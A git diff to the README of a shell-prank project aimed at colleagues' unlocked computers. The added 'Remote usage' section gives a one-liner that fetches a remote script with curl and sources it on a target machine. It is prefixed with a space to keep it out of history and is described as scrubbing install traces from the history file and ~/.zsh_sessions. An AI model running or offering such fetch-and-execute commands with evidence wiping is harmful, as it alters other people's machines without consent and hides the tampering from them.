@@ -2,9 +2,26 @@
 Let's educate your colleague who left their computer open and unattended!
 
 ## usage
+Clone once to set up your prank base, then import the latest pranks anytime.
 ```
 git clone https://github.com/Motifman/prank-zshrc-zoo.git
+cd prank-zshrc-zoo
 ```
+Import the latest pranks later (run inside the base directory):
+```
+sh update.sh
+```
+## Remote usage (no clone left behind)
+Apply a prank to a target machine without cloning the repo there.
+Run it with `source` so it affects the current shell, and **prefix with a space**
+so the command itself is not saved to history:
+```
+ source <(curl -fsSL https://raw.githubusercontent.com/Motifman/prank-zshrc-zoo/main/train_remote.sh) virus.sed
+```
+This scrubs the install traces from the history file and `~/.zsh_sessions`,
+and leaves no `prank-zshrc-zoo` directory behind. Keep your own clone as the
+base and `sh update.sh` to import the latest pranks.
+
 ## One-Time virus 
 You need to use "source" instead of "zsh".
 ```
